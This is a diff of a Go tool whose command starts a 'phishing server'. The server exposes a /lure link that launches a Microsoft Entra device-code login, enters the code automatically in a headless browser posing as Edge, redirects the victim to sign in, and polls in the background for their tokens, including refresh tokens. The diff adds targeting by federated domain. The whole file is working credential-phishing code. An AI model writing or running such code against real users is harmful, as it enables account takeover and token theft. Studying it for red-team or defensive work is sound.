@@ -9,18 +9,19 @@ import (
 	"net"
 	"net/http"
 	"os"
+	"strings"
 	"time"
 )
 
 const EdgeOnWindows string = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edq/135.0.0.0"
 const MsAuthenticationBroker string = "29d9ed98-a469-4536-ade2-f981bc1d605e"
-const DefaultTenant string = "common"
 
 var (
-	address   string
-	userAgent string
-	clientId  string
-	tenant    string
+	address    string
+	userAgent  string
+	clientId   string
+	domain     string
+	tenantInfo *entra.TenantInfo
 )
 
 func init() {
@@ -28,7 +29,7 @@ func init() {
 	runCmd.Flags().StringVarP(&address, "address", "a", ":8080", "Provide the servers listening address")
 	runCmd.Flags().StringVarP(&userAgent, "user-agent", "u", EdgeOnWindows, "User-Agent used by HeadlessBrowser & API calls")
 	runCmd.Flags().StringVarP(&clientId, "client-id", "c", MsAuthenticationBroker, "ClientId for requesting token")
-	runCmd.Flags().StringVarP(&tenant, "tenant", "t", DefaultTenant, "Tenant for requesting token")
+	runCmd.Flags().StringVarP(&domain, "domain", "d", "", "Domain for requesting token")
 }
 
 var runCmd = &cobra.Command{
@@ -36,6 +37,9 @@ var runCmd = &cobra.Command{
 	Short: "Starts the phishing server",
 	Long:  "Starts the phishing server. Listens by default on http://localhost:8080/lure",
 	Run: func(cmd *cobra.Command, args []string) {
+		logger := slog.New(slog.NewJSONHandler(os.Stdout, &slog.HandlerOptions{Level: slog.LevelInfo}))
+		slog.SetDefault(logger)
+
 		// Set up a resource handler
 		http.HandleFunc("/lure", lureHandler)
 
@@ -46,12 +50,35 @@ var runCmd = &cobra.Command{
 			os.Exit(1)
 		}
 
+		if domain == "" {
+			slog.Error("Domain must be set", err)
+			os.Exit(1)
+		}
+
+		domain = strings.ToLower(domain)
+
+		tenantInfo, err = entra.GetTenantInfo(domain)
+		if err != nil {
+			slog.Error("TenantInfos can not be retrieved", err)
+			os.Exit(1)
+		}
+
+		if tenantInfo == nil {
+			slog.Error("TenantInfos can not be retrieved")
+			os.Exit(1)
+		}
+
+		if tenantInfo.UserRealmInfo.NameSpaceType != "Federated" {
+			slog.Error("TenantInfos revealed that " + domain + " (Id:" + tenantInfo.TenantId + ") is not 'federated'. Then this technique to enter automatically the device code will not work!")
+			os.Exit(1)
+		}
+
 		// Create a Server instance to listen on port
 		server := &http.Server{
 			Addr: address,
 		}
 
-		slog.Info("Start Server using Tenant:" + tenant + " ClientId:" + clientId)
+		slog.Info("Start Server using Domain:" + tenantInfo.Domain + " Tenant:" + tenantInfo.TenantId + " ClientId:" + clientId)
 		if host == "" {
 			host = "localhost"
 		}
@@ -69,30 +96,31 @@ func lureHandler(w http.ResponseWriter, r *http.Request) {
 	http.DefaultClient.Transport = utils.SetUserAgent(http.DefaultClient.Transport, userAgent)
 
 	scopes := []string{"openid", "profile", "offline_access"}
-	deviceAuth, err := entra.RequestDeviceAuth(tenant, clientId, scopes)
+	deviceAuth, err := entra.RequestDeviceAuth(tenantInfo.TenantId, clientId, scopes)
 	if err != nil {
 		slog.Error("Error during starting device code flow:", err)
 		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
 		return
 	}
 
-	redirectUri, err := entra.EnterDeviceCodeWithHeadlessBrowser(deviceAuth, userAgent)
+	redirectUri, err := entra.EnterDeviceCodeWithHeadlessBrowser(deviceAuth.UserCode, tenantInfo, userAgent)
 	if err != nil {
 		slog.Error("Error during headless browser automation:", err)
 		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
 		return
 	}
-	go startPollForToken(tenant, clientId, deviceAuth)
+	go startPollForToken(tenantInfo.TenantId, clientId, deviceAuth)
+	slog.Info("Redirecting user to: '" + redirectUri + "'")
 	http.Redirect(w, r, redirectUri, http.StatusFound)
 }
 
-func startPollForToken(tenant string, clientId string, deviceAuth *entra.DeviceAuth) {
+func startPollForToken(tenantId string, clientId string, deviceAuth *entra.DeviceAuth) {
 	pollInterval := time.Duration(deviceAuth.Interval) * time.Second
 
 	for {
 		time.Sleep(pollInterval)
 		slog.Info("Check for token: " + deviceAuth.UserCode)
-		result, err := entra.RequestToken(tenant, clientId, deviceAuth)
+		result, err := entra.RequestToken(tenantId, clientId, deviceAuth)
 
 		if err != nil {
 			slog.Error(`"%#v"`, err)
